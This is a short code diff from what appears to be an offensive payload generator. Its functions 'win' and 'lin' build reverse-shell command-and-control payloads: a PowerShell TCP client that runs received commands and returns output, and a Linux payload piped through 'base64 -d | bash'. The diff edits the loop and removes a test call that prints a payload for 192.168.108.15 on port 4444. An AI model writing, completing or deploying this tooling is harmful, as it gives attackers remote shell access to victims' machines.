@@ -53,13 +53,13 @@ def win(ip, port, delay, jitter):
                     $writer.WriteLine($formattedOutput)
                     $writer.WriteLine("ac2delim")
                 }
-                Start-Sleep -Milliseconds 500 # Short pause between command checks
             }
 
             # Close connection after processing commands
             $reader.Close()
             $writer.Close()
             $tcpClient.Close()
+            $stream = $null
         }
         catch {
             Write-Host "Failed to connect or connection lost. Retrying after delay..."
@@ -113,6 +113,3 @@ def lin(ip, port, delay, jitter):
     enc_payload = "echo " + b64 + " | base64 -d | bash"
 
     return enc_payload
-
-
-print(lin("192.168.108.15", 4444, 10, 3))
